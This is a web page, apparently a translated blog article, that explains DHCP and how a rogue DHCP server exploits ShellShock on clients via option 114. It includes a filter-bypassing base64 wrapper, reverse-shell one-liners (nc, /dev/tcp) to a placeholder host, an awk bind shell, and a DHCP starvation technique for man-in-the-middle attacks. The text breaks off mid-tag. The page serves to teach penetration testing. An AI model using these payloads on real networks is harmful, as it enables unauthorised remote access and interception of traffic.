<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We attack DHCP</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article we will explain how to exploit ShellShock on a DHCP client and get a full-fledged reverse or bind shell on it. The Internet is replete...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We attack DHCP</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/web/3cf/b27/403/3cfb2740364e40eb9d61c1c99f5ccf7c.png" alt="LOGO"></p><br><p>  In this article we will explain how to exploit ShellShock on a DHCP client and get a full-fledged reverse or bind shell on it.  The Internet is replete with <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/bash-bug-saga-continues-shellshock-exploit-via-dhcp/">articles</a> telling about the shellshock exploitation possibilities on DHCP clients.  There are even <a href="http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell">articles</a> on how to get a reverse shell on a DHCP client.  However, we have not yet met a stable and universally working tool for getting the shell.  Those who are in the subject may not see the new one here, but it is possible that you might be interested to know how we managed to automate the receipt of reverse and bind shell in terms of filtering and escaping characters on the DHCP client side.  In addition, we will talk about what might be the most interesting about DHCP. <a name="habracut"></a></p><br><p>  DHCP is used to automatically assign an IP address, default gateway, DNS server, etc.  As a transport, this protocol uses UDP, which means that we can replace all fields of interest in the network packet without any problems, starting with the data link layer: source MAC address, source IP address, source ports ‚Äî that is, everything we want </p><br><h2 id="rabotaet-dhcp-v-dvuh-slovah-primerno-tak">  DHCP works, <del>  in a nutshell </del>  , like that: </h2><br><ol><li><p> <strong>DHCPDISCOVER</strong> The client sends a broadcast network packet in order to find a DHCP server on the network, while with the data link layer everything is clear and we will not write further about it, the network one is based on our own experience, there can be anything here depending on the client, but it should be: <br><br> <code>SRC IP: 0.0.0.0, DST IP: 255.255.255.255.</code> <br>  At the transport level, all requests are sent as follows: <br> <code>SRC PORT: 68, DST PORT: 67</code> <br>  Accordingly, when the server responds to the client: <br> <code>SRC PORT: 67, DST PORT: 68</code> <br> <br>  UDP checksum can not be considered.  We have not met a single DHCP server that would check it, and the network equipment passes packets with zero UDP checksum without any problems.  In the first byte of the application level (op field - message type) the client sets the value - <strong>0x01</strong> (BOOTREQUEST - request from the client to the server).  We will not stop on the remaining fields of the packet, since their description, length and values ‚Äã‚Äãare in the <a href="https://tools.ietf.org/html/rfc2131">RFC</a> and in <a href="https://ru.wikipedia.org/wiki/DHCP">WIKI</a> .  In the request from the client, we are also interested in the <strong>xid</strong> field (Transaction ID is a random number of 4 bytes at the offset 0x04 from the beginning of the application level in the packet).  If the server in the response <strong>sets the xid</strong> field not equal to the client's xid, then the client will discard the response from the server, as it considers that this response is in another transaction.  Let us dwell on the DHCP options of the package.  A total of 256, and a complete list can be found <a href="https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml">here</a> or <a href="http://www.networksorcery.com/enp/protocol/bootp/options.htm">here</a> .  The client must set the option with code <strong>53</strong> ( <a href="https://tools.ietf.org/html/rfc2132">DHCP message type</a> type of DHCP message) equal to <strong>0x01</strong> , this means that this packet is intended to find the DHCP server, and option <strong>55</strong> ( <a href="https://tools.ietf.org/html/rfc2132">Parameter Request List</a> list of parameters requested from the server, for example, gateway address, subnet mask , DNS servers, etc.). <br><br>  This is what this request in WireShark looks like: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/web/18e/d39/814/18ed398147f543b7b49f766be20c8202.png" alt="DHCPDISCOVER"></p><br></li><li><p>  <strong>DHCPOFFER</strong> The server receives the request from the client and sends it an offer.  At the network level, the server sets its IP address as the SRC IP, the DST IP should be: 255.255.255.255, but this is not always the case.  The DST IP can also be set to the IP address allocated to the client, or the IP address of the repeater, if it participates in the process.  You ask, how does the packet reach the client if he does not have an IP address yet?  It's simple: in the DHCPDISCOVER and DHCPREQUEST requests, the client specifies its MAC address in the <strong>chaddr</strong> (Client MAC address) field. <br><br>  Thus, the server or relay knows where to deliver the packet on the data link layer, since the server or relay is always within the same <a href="https://ru.wikipedia.org/wiki/%25D0%25A8%25D0%25B8%25D1%2580%25D0%25BE%25D0%25BA%25D0%25BE%25D0%25B2%25D0%25B5%25D1%2589%25D0%25B0%25D1%2582%25D0%25B5%25D0%25BB%25D1%258C%25D0%25BD%25D1%258B%25D0%25B9_%25D0%25B4%25D0%25BE%25D0%25BC%25D0%25B5%25D0%25BD">broadcast domain</a> with the client, and what happens at the network level is not so important. <del>  UDP magic </del>  .  In the message type, the value is <strong>0x02</strong> (BOOTREPLY is the server's response to the client).  In the <strong>xid</strong> field <strong>,</strong> set the value equal to the value of the xid field in the client's request.  In the field <strong>yiaddr</strong> (Your (client) IP address) set the IP-address of the client, the proposed server.  What appears in the DHCP options: in option with code 53 ( <a href="https://tools.ietf.org/html/rfc2132">DHCP message type</a> ), the value is 0x02 (DHCPOFFER), code 51 ( <a href="https://tools.ietf.org/html/rfc2132">IP Address Lease Time</a> ) - IP address lease time, code 54 ( <a href="https://tools.ietf.org/html/rfc2132">Server Identifier</a> ) - DHCP IP address -server.  All other offer options depend on the parameters requested by the client, the client list is specified in the DHCPDISCOVER request in option 55 ( <a href="https://tools.ietf.org/html/rfc2132">Parameter Request List</a> ). <br><br><img src="https://habrastorage.org/web/5d3/982/b66/5d3982b668b34b93a945c4949ecf2d81.png" alt="DHCPOFFER"></p><br></li><li><p>  <strong>DHCPREQUEST</strong> The client sends a request for network parameters to the server.  At the network level, it should be like this: <code>SRC IP: 0.0.0.0 DST IP: 255.255.255.255</code> but maybe so: the SRC IP is set to the IP address that the server assigned in its offer (the <strong>yiaddr</strong> field), and the DST IP is set to IP -address, which is located in the offer option of the server with the code 54 ( <a href="https://tools.ietf.org/html/rfc2132">Server Identifier</a> ).  The DHCP options in this request are no different from the DHCPDISCOVER request, with the exception of the option with code 53 ( <a href="https://tools.ietf.org/html/rfc2132">DHCP message type DHCP message type</a> ) equal to <strong>003</strong> - this means that this packet is intended to request parameters from the DHCP server.  And the client also adds an option with a code 54 ( <a href="https://tools.ietf.org/html/rfc2132">Server Identifier</a> ) to the request, since he already knows the IP address of the server, as well as an option with a code 50 ( <a href="https://tools.ietf.org/html/rfc2132">Requested IP address</a> ).  In addition, the client can set option 12 ( <a href="https://tools.ietf.org/html/rfc2132">Host Name Option to</a> their own host name), etc. <br><br><img src="https://habrastorage.org/web/33c/75f/074/33c75f074b984caa99f4ae3fc97f7dd4.png" alt="DHCPREQUEST"></p><br></li><li>  <strong>DHCPACK</strong> Server sends a confirmation to the client.  At the network level, it should be like this: <code>SRC IP: &lt;IP- &gt; DST IP: 255.255.255.255</code> .  The options and fields of this packet do not differ from DHCPOFFER, with the exception of the option with code 53 ( <a href="https://tools.ietf.org/html/rfc2132">DHCP message type</a> type of DHCP message) equal to <strong>005</strong> - this means that this packet is a confirmation from the DHCP server. <br><br><img src="https://habrastorage.org/web/470/d4f/e1f/470d4fe1f38c4722bbce2dab4cdd4197.png" alt="DHCPACK"></li></ol><br><p>  Further, the client using the <strong>ARP</strong> protocol tries to detect a conflict of IP addresses in the local network ( <a href="https://tools.ietf.org/html/rfc5227">Address Conflict Detection</a> ).  If no conflict is found, the client sets the parameters received from the DHCPACK to the network interface.  If it is found, the client sends out a broadcast DHCP <strong>reject</strong> message <strong>DHCPDECLINE</strong> , after which the procedure for obtaining an IP address is repeated. </p><br><p>  Also, DHCP has another feature: if a client previously sent a <strong>DHCPDISCOVER</strong> request, then when it reconnects to the same network, the client immediately sends a <strong>DHCPREQUEST</strong> ;  while in the DHCP options with code 50 ( <a href="https://tools.ietf.org/html/rfc2132">Requested IP address</a> ), the IP address obtained earlier is set. </p><br><p>  Let's stop on mentioned <strong>DHCPDECLINE in</strong> more detail.  In practice, it looks like this: </p><br><ol><li><p>  The client sends a <strong>DHCPREQUEST</strong> because it has already connected to this network. <code>Transaction ID: 0x825b824a; Requested IP: 192.168.1.171; Client MAC address: 08:00:27:ce:7a:64</code> <br><br><img src="https://habrastorage.org/web/dde/934/1fb/dde9341fb7d14a618d44d4837d8e7f94.png" alt="DHCPREQUEST before DHCPDECLINE"></p><br></li><li><p>  The server responds with a <strong>DHCPACK</strong> . <br> <code>Transaction ID: 0x825b824a; yiaddr: 192.168.1.171; siaddr: 192.168.1.1; router: 192.168.1.1</code> <br> <img src="https://habrastorage.org/web/348/948/488/3489484884ca425fb11d915ae7c86b95.png" alt="DHCPACK before DHCPDECLINE"></p><br></li><li><p>  The client uses the <strong>ARP</strong> protocol to find out the MAC address of the gateway, and then, through the same <strong>ARP</strong> , tries to detect a conflict of IP addresses in the local network ( <a href="https://tools.ietf.org/html/rfc5227">Address Conflict Detection</a> ).  The query looks like this: <br><br> <code>sender mac: 08:00:27:ce:7a:64; sender ip: 0.0.0.0; target mac: 00:00:00:00:00:00; target ip: 192.168.1.171</code> <br> <br><img src="https://habrastorage.org/web/f3c/b43/6c4/f3cb436c405c41dbbaf3eb248025e9d7.png" alt="Address conflict detection"></p><br></li><li><p>  The host with the IP address <strong>192.168.1.171</strong> responds to the ARP request. <br><br><img src="https://habrastorage.org/web/f0d/136/5fc/f0d1365fc0ed476c8e14849e09f31467.png" alt="ARP reply"></p><br></li><li><p>  The client has detected a conflict of IP addresses on the network and sends a broadcast <strong>DHCPDECLINE</strong> . <br><br> <code>Transaction ID: 0x825b824a; Requested IP: 192.168.1.171; ciaddr: 192.168.1.171</code> <br> <br><img src="https://habrastorage.org/web/1db/9be/144/1db9be1449fb43228d56d60e0def8198.png" alt="DHCPDECLINE"></p><br></li><li>  The procedure for obtaining an IP address is repeated, but with a different Transaction ID: <strong>0x713a0fe7</strong> .  Did you notice the packages with numbers 89, 101, 106, 136 and 151?  If yes, then they probably understood that this time the server allocated the client‚Äôs IP address <strong>192.168.1.172</strong> and before that the DHCP server itself using the same <strong>ARP</strong> (packets with numbers 89, 101, 106: <code>Who has 192.168.1.172? Tell 192.168.1.1</code> ) made sure that the IP address <strong>192.168.1.172 is</strong> free, and only then sent a <strong>DHCPOFFER</strong> .  After that, the client once again tried to identify the conflict of IP addresses (packets with numbers 136, 151: <code>Who has 192.168.1.172? Tell 0.0.0.0</code> ). <br><br><img src="https://habrastorage.org/web/e21/68a/f4c/e2168af4cc2e473d8dd2a23ee7305f59.png" alt="Retrieving IP address again"></li></ol><br><p>  We already know that a client, having connected to the network at least once, will only send a DHCPREQUEST request, putting the previously received IP address into the Requested IP address.  But what if the DHCP server has already allocated this IP address, has the configuration or address changed, and the server cannot give this address to the client?  For this, there is a <strong>DHCPNAK</strong> message type.  It works as follows: </p><br><ol><li><p>  The client sends a <strong>DHCPREQUEST</strong> . <br> <code>Transaction ID: 0xa7ddc5cb; Requested IP: 192.168.1.14</code> <br> <br><img src="https://habrastorage.org/web/dd9/6c0/82a/dd96c082abde48728ee3d9aa1d648f11.png" alt="DHCPREQUEST before DHCPNAK"></p><br></li><li><p>  The server settings specify the range in which it can allocate an IP address, but the one requested by the client is not included in this range, therefore the server sends a <strong>DHCPNAK</strong> . <br> <code>Transaction ID: 0xa7ddc5cb; Message: address not available</code> <br> <br><img src="https://habrastorage.org/web/2bc/84c/e14/2bc84ce1488b40f4a99ce06de0decf4f.png" alt="DHCPNAK"></p><br></li><li>  The procedure for obtaining an IP address is repeated, but with a different Transaction ID: <strong>0xcfbf77a9</strong> . <br><br><img src="https://habrastorage.org/web/2ae/c9f/f7f/2aec9ff7f5a04915a7edd4830217da35.png" alt="Retrieving IP address again"></li></ol><br><h2 id="pereydem-k-shellshock">  Let's go to shellshock </h2><br><p>  There is no point in writing how and why shellshock works, because this vulnerability is one of the most popular, and there are a great many articles about it.  It is better to dwell on the moment how to get the shell on the DHCP client, in case we act as a DHCP server. </p><br><h3 id="v-kakie-polya-i-opcii-mozhno-inektirovat">  Which fields and options can I inject? </h3><br><p>  <strong>Answer:</strong> almost any!  Here is a list of DHCP option codes that can be injected into (checked on CentOS 6.5 NetworkManager): <a href="https://tools.ietf.org/html/rfc2132">14</a> , <a href="https://tools.ietf.org/html/rfc2132">18</a> , <a href="https://tools.ietf.org/html/rfc2132">43</a> , <a href="https://tools.ietf.org/html/rfc2132">56</a> , <a href="https://tools.ietf.org/html/rfc2132">60</a> , <a href="https://tools.ietf.org/html/rfc2132">61</a> , <a href="https://tools.ietf.org/html/rfc2242">62</a> , <a href="https://tools.ietf.org/html/rfc2242">63</a> , <a href="https://tools.ietf.org/html/rfc2132">64</a> , <a href="https://tools.ietf.org/html/rfc2132">66</a> , <a href="https://tools.ietf.org/html/rfc2132">67</a> , <a href="https://tools.ietf.org/html/rfc3004">77</a> , <a href="https://tools.ietf.org/html/rfc4039">80</a> , <a href="https://tools.ietf.org/html/rfc3046">82</a> , <a href="https://tools.ietf.org/html/rfc4174">83</a> , <a href="https://tools.ietf.org/html/rfc3679">84</a> , <a href="https://tools.ietf.org/html/rfc2241">86</a> , <a href="https://tools.ietf.org/html/rfc2241">87</a> , <a href="https://tools.ietf.org/html/rfc3118">90</a> , <a href="https://tools.ietf.org/html/rfc4578">94</a> , <a href="https://tools.ietf.org/html/rfc3679">95</a> , <a href="https://tools.ietf.org/html/rfc3679">96</a> , <a href="https://tools.ietf.org/html/rfc4578">97</a> , <a href="https://tools.ietf.org/html/rfc2485">98</a> , <a href="https://tools.ietf.org/html/rfc4776">99</a> , <a href="https://tools.ietf.org/html/rfc4833">100</a> , <a href="https://tools.ietf.org/html/rfc4833">101</a> , <a href="https://tools.ietf.org/html/rfc3679">102</a> , <a href="https://tools.ietf.org/html/rfc3679">103</a> , <a href="https://tools.ietf.org/html/rfc3679">104</a> , <a href="https://tools.ietf.org/html/rfc3679">105</a> , <a href="https://tools.ietf.org/html/rfc3679">106</a> , <a href="https://tools.ietf.org/html/rfc3679">107</a> , <a href="https://tools.ietf.org/html/rfc3679">108</a> , <a href="https://tools.ietf.org/html/rfc3679">109</a> , <a href="https://tools.ietf.org/html/rfc3679">110</a> , <a href="https://tools.ietf.org/html/rfc3679">111</a> , <a href="https://tools.ietf.org/html/rfc3679">113</a> , <a href="https://tools.ietf.org/html/rfc3679">114</a> , <a href="https://tools.ietf.org/html/rfc3679">115</a> , <a href="https://tools.ietf.org/html/rfc2563">116</a> , <a href="https://tools.ietf.org/html/rfc2937">117</a> , <a href="https://tools.ietf.org/html/rfc3361">120</a> , <a href="https://tools.ietf.org/html/rfc3495">122</a> , <a href="https://tools.ietf.org/html/rfc6225">123</a> , <a href="https://tools.ietf.org/html/rfc3925">124</a> , <a href="https://tools.ietf.org/html/rfc3925">125</a> , <a href="https://tools.ietf.org/html/rfc3679">126</a> , <a href="https://tools.ietf.org/html/rfc3679">127</a> , <a href="https://tools.ietf.org/html/rfc4578">128</a> , <a href="https://tools.ietf.org/html/rfc4578">129</a> , <a href="https://tools.ietf.org/html/rfc4578">130</a> , <a href="https://tools.ietf.org/html/rfc4578">131</a> , <a href="https://tools.ietf.org/html/rfc4578">132</a> , <a href="https://tools.ietf.org/html/rfc4578">133</a> , <a href="https://tools.ietf.org/html/rfc4578">134</a> , <a href="https://tools.ietf.org/html/rfc4578">135</a> , <a href="https://tools.ietf.org/html/rfc5192">136</a> , <a href="https://tools.ietf.org/html/rfc5223">137</a> , <a href="https://tools.ietf.org/html/rfc5417">138</a> , <a href="https://tools.ietf.org/html/rfc5678">139</a> , <a href="https://tools.ietf.org/html/rfc5678">140</a> , <a href="https://tools.ietf.org/html/rfc6011">141</a> , <a href="https://tools.ietf.org/html/rfc6153">142</a> , <a href="https://tools.ietf.org/html/rfc6153">143</a> , <a href="https://tools.ietf.org/html/rfc6225">144</a> , <a href="https://tools.ietf.org/html/rfc6704">145</a> , <a href="https://tools.ietf.org/html/rfc6731">146</a> , <a href="https://tools.ietf.org/html/rfc3942">147</a> , <a href="https://tools.ietf.org/html/rfc3942">148</a> , <a href="https://tools.ietf.org/html/rfc3942">149</a> , <a href="https://tools.ietf.org/html/rfc5859">150</a> , <a href="https://tools.ietf.org/html/rfc6926">151</a> , <a href="https://tools.ietf.org/html/rfc6926">152</a> , <a href="https://tools.ietf.org/html/rfc6926">153</a> , <a href="https://tools.ietf.org/html/rfc6926">154</a> , <a href="https://tools.ietf.org/html/rfc6926">155</a> , <a href="https://tools.ietf.org/html/rfc6926">156</a> , <a href="https://tools.ietf.org/html/rfc6926">157</a> , <a href="https://tools.ietf.org/html/rfc7291">158</a> , <a href="https://tools.ietf.org/html/rfc7618">159</a> , <a href="https://tools.ietf.org/html/rfc7710">160</a> , <a href="https://datatracker.ietf.org/doc/draft-ietf-opsawg-mud/%3Finclude_text%3D1">161</a> , <a href="https://tools.ietf.org/html/rfc3942">162</a> , <a href="https://tools.ietf.org/html/rfc3942">163</a> , <a href="https://tools.ietf.org/html/rfc3942">164</a> , <a href="https://tools.ietf.org/html/rfc3942">165</a> , <a href="https://tools.ietf.org/html/rfc3942">166</a> , <a href="https://tools.ietf.org/html/rfc3942">167</a> , <a href="https://tools.ietf.org/html/rfc3942">168</a> , <a href="https://tools.ietf.org/html/rfc3942">169</a> , <a href="https://tools.ietf.org/html/rfc3942">170</a> , <a href="https://tools.ietf.org/html/rfc3942">171</a> , <a href="https://tools.ietf.org/html/rfc3942">172</a> , <a href="https://tools.ietf.org/html/rfc3942">173</a> , <a href="https://tools.ietf.org/html/rfc3942">174</a> , <a href="https://tools.ietf.org/html/rfc3942">175</a> , <a href="https://tools.ietf.org/html/rfc3942">176</a> , <a href="https://tools.ietf.org/html/rfc3942">177</a> , <a href="https://tools.ietf.org/html/rfc3942">178</a> , <a href="https://tools.ietf.org/html/rfc3942">179</a> , <a href="https://tools.ietf.org/html/rfc3942">180</a> , <a href="https://tools.ietf.org/html/rfc3942">181</a> , <a href="https://tools.ietf.org/html/rfc3942">182</a> , <a href="https://tools.ietf.org/html/rfc3942">183</a> , <a href="https://tools.ietf.org/html/rfc3942">184</a> , <a href="https://tools.ietf.org/html/rfc3942">185</a> , <a href="https://tools.ietf.org/html/rfc3942">186</a> , <a href="https://tools.ietf.org/html/rfc3942">187</a> , <a href="https://tools.ietf.org/html/rfc3942">188</a> , <a href="https://tools.ietf.org/html/rfc3942">189</a> , <a href="https://tools.ietf.org/html/rfc3942">190</a> , <a href="https://tools.ietf.org/html/rfc3942">191</a> , <a href="https://tools.ietf.org/html/rfc3942">192</a> , <a href="https://tools.ietf.org/html/rfc3942">193</a> , <a href="https://tools.ietf.org/html/rfc3942">194</a> , <a href="https://tools.ietf.org/html/rfc3942">195</a> , <a href="https://tools.ietf.org/html/rfc3942">196</a> , <a href="https://tools.ietf.org/html/rfc3942">198</a> , <a href="https://tools.ietf.org/html/rfc3942">199</a> , <a href="https://tools.ietf.org/html/rfc3942">200</a> , <a href="https://tools.ietf.org/html/rfc3942">201</a> , <a href="https://tools.ietf.org/html/rfc3942">202</a> , <a href="https://tools.ietf.org/html/rfc3942">203</a> , <a href="https://tools.ietf.org/html/rfc3942">204</a> , <a href="https://tools.ietf.org/html/rfc3942">205</a> , <a href="https://tools.ietf.org/html/rfc3942">206</a> , <a href="https://tools.ietf.org/html/rfc3942">207</a> , <a href="https://tools.ietf.org/html/rfc5071">208</a> , <a href="https://tools.ietf.org/html/rfc5071">209</a> , <a href="https://tools.ietf.org/html/rfc5071">210</a> , <a href="https://tools.ietf.org/html/rfc5071">211</a> , <a href="https://tools.ietf.org/html/rfc5969">212</a> , <a href="https://tools.ietf.org/html/rfc5986">213</a> , 214, 215, 216, 217, 218, 219 , <a href="https://tools.ietf.org/html/rfc6656">220</a> , <a href="https://tools.ietf.org/html/rfc6607">22</a>  <a href="https://tools.ietf.org/html/rfc6607">1</a> , <a href="https://tools.ietf.org/html/rfc3942">222</a> , <a href="https://tools.ietf.org/html/rfc3942">223</a> , 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 250, 251, 253. </p><br><p>  In our PoC, we will use the DHCP option code 114 ( <a href="https://tools.ietf.org/html/rfc3679">URL</a> ).  Why?  Because its length is variable (maximum length is 256 bytes), and also because <a href="https://xakep.ru/2014/09/26/shellshock-dhcp/">everyone</a> uses it.  Her description is still <a href="https://teamwork.gigaset.com/gigawiki/display/GPPPO/DHCP%2Boption%2B114">here</a> .  There is even <a href="https://news.ycombinator.com/item%3Fid%3D8372040">an article</a> about how to upgrade vulnerable to shellshock systems with this option :) </p><br><h3 id="kakie-u-nas-ogranicheniya">  What are our limitations? </h3><br><p>  <strong>The answer:</strong> there are many, too many! </p><br><ol><li>  Length - 256 bytes </li><li>  It is possible to use only interpreter commands. </li><li>  A big restriction on the characters used: some are filtered, some are escaped.  It depends on the DHCP client.  Here is a set of characters that you can't use everywhere: <code>"';&amp;|</code> </li><li>  After the command is executed, the IPv4 address may not be assigned, in which case it is possible to use the IPv6 link-local-address if IPv6 is not enabled on the interface </li><li>  You must use absolute paths, otherwise the command may not be executed. </li></ol><br><h3 id="i-chto-togda-delat">  And then what to do? </h3><br><p>  <strong>Answer:</strong> bypass restrictions! <br>  To bypass the filter, we must execute all with one command.  Let's do it like this: </p><br><pre> <code class="bash hljs">/bin/sh &lt;(/usr/bin/base64 -d &lt;&lt;&lt; Base64String)</code> </pre> <br><p>  Here, the input of the interpreter <strong>/ bin / sh</strong> is the output of <strong>/ usr / bin / base64</strong> , which decodes the string <strong>Base64String</strong> .  Thus, we have already used 34 bytes, the length of Base64String should not exceed <strong>222</strong> bytes. </p><br><p>  And what will happen in Base64String?  Do not forget about the fourth restriction, so first of all, set the IP address of the interface with the command: </p><br><pre> <code class="bash hljs">/bin/ip addr add &lt;IP&gt;/&lt;MASK&gt; dev eth0;</code> </pre> <br><p>  This command imposes one more restriction on us: we need to know the name of the interface to which we assign an IP address.  By default, in older versions of Linux, which still have a shellshock, the first network interface is called <strong>eth0</strong> , so we are guided by it.  Back in this line we have to put a reverse shell or bind shell. </p><br><p>  For reverse shell we will use the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">standard shell</a> using nc: </p><br><pre> <code class="bash hljs">nc -e /bin/sh &lt;IP&gt; &lt;PORT&gt; 2&gt;&amp;1 &amp; rm /tmp/f 2&gt;/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f &amp;</code> </pre> <br><p>  For reverse shell, you can also use the command <a href="http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell">from here</a> : </p><br><pre> <code class="bash hljs">/bin/bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> </pre> <br><p>  For the bind shell, we will use <strong>/ cmd / unix / bind_awk</strong> from <strong>Metasploit</strong> , as one of the shortest: </p><br><pre> <code class="bash hljs">awk <span class="hljs-string"><span class="hljs-string">'BEGIN{s="/inet/tcp/&lt;PORT&gt;/0/0";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}'</span></span> &amp;</code> </pre> <br><h3 id="pochttpsgithubcomvladimir-ivanov-gitraw-packet">  <a href="https://github.com/Vladimir-Ivanov-Git/raw-packet">Poc</a> </h3><br><h3 id="video">  Video: </h3><br><iframe width="560" height="315" src="https://www.youtube.com/embed/-B_U9f_Uofk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/u-GXXyQnSVg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/a6gijZr7Ux0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="esche-nemnogo-pro-dhcp">  Still <del>  Little </del>  about DHCP </h2><br><p>  In no case, DHCP should not be considered solely as a method of obtaining <strong>RCE</strong> on clients, because, first, we must respond faster than the real DHCP server on the network, and, second, the client must have a shellshock, which is unlikely.  DHCP should first be considered as a method for implementing <strong>MITM</strong> . </p><br><p>  Let's talk about how to respond to any request faster than the DHCP server.  The most obvious option is to be closer to the client by the location in the network, and our hardware and algorithm should work faster.  However, in most cases this is not the case. </p><br><p>  There is a second option: you need to load the server, but do not take up new IP addresses on the network, in order not to exhaust the entire pool of free addresses (this attack is called DHCP starvation).  As you already understood, you need to send a large number of <strong>DHCPDISCOVER</strong> requests, since the server must process each one of them and send a <strong>DHCPOFFER</strong> in response.  However, we will not send a <strong>DHCPREQUEST</strong> as part of this transaction, so the server will wait for it.  The IP address will not be considered allocated because the procedure for obtaining the IP is not completed. </p><br><p>  Let's see how it looks in practice. </p><br><p>  Load graphs and processes before sending DHCPDISCOVER requests: </p><br><p><img src="https://habrastorage.org/web/79a/809/4fa/79a8094fa7d641f08c325bd625b87b26.png" alt="Before load test realtime graphs"></p><br><p><img src="https://habrastorage.org/web/803/0a8/c87/8030a8c87e8c4fce911fd3793ce4ddd7.png" alt="Before load test processes"></p><br><p>  The figures show that the load average of the router ranges from 0.1 to 0.3, and the dnsmasq process takes 0% CPU. </p><br><p>  Load graphs, processes and list of DHCP clients during the sending of DHCPDISCOVER requests: </p><br><p><img src="https://habrastorage.org/web/bce/10e/188/bce10e1885584c88853990b56ecc231c.png" alt="During load test realtime graphs"></p><br><p><img src="https://habrastorage.org/web/473/fb3/a71/473fb3a71dba4be5900515b28fb7e7fa.png" alt="During load test processes"></p><br><p><img src="https://habrastorage.org/web/f70/994/b1d/f70994b1d9614b9f9097c879084c7065.png" alt="During load test DHPC clients"></p><br><p>  The load average of the router has increased to 1.96, and it no longer has time to respond to all DHCPDISCOVER requests, the dnsmasq process takes up as much as 64% of the CPU, but only our host is on the DHCP client list. </p><br><p>  As a result, we and the server loaded a little, and did not occupy IP addresses.  If we filter out all the DHCPDISCOVER requests that we have generated, it is likely that we will respond faster than the real DHCP server will increase significantly.  The task is completed, go ahead. </p><br><p>  Now let's talk about the <a href="https://tools.ietf.org/html/rfc2132">types of DHCP messages</a> : </p><br><table><thead><tr><th>  Value </th><th>  Message_Type </th></tr></thead><tbody><tr><td>  one </td><td>  DHCPDISCOVER </td></tr><tr><td>  2 </td><td>  DHCPOFFER </td></tr><tr><td>  3 </td><td>  DHCPREQUEST </td></tr><tr><td>  four </td><td>  DHCPDECLINE </td></tr><tr><td>  five </td><td>  DHCPACK </td></tr><tr><td>  6 </td><td>  DHCPNAK </td></tr><tr><td>  7 </td><td>  DHCPRELEASE </td></tr><tr><td>  eight </td><td>  DHCPINFORM </td></tr></tbody></table><br><p>  We have already disassembled the first six types of messages, there are only two left: the seventh (DHCPRELEASE) and the eighth (DHCPINFORM).  Let us dwell on them in more detail. </p><br><p>  The client may explicitly terminate the lease of the IP address.  To do this, it sends a <strong>DHCPRELEASE</strong> address lease release <strong>message</strong> to the server that provided the address earlier.  Unlike other messages, it is not broadcast. </p><br><p>  The <strong>DHCPINFORM</strong> information <strong>message is</strong> intended to define additional network parameters for those clients whose IP address is manually configured.  Based on our experience, we can say that only Windows hosts send such messages :(. The server responds to a similar <strong>DHCPACK</strong> request without allocating an IP address. There is your own <a href="https://tools.ietf.org/html/draft-ietf-dhc-dhcpinform-clarify-06">rfc project</a> for these messages. You already understand that we can put your gateway in DHCPACK , DNS, etc. The main thing is to respond before the real DHCP server, and this problem has already been solved above. </p><br><h2 id="dhcp-starvation--dhcp-relay-agent">  DHCP starvation &amp; DHCP relay agent </h2><br><p>  In this article, we mentioned about the DHCP starvation attack - the exhaustion of the pool of free IP addresses.  There is an <a 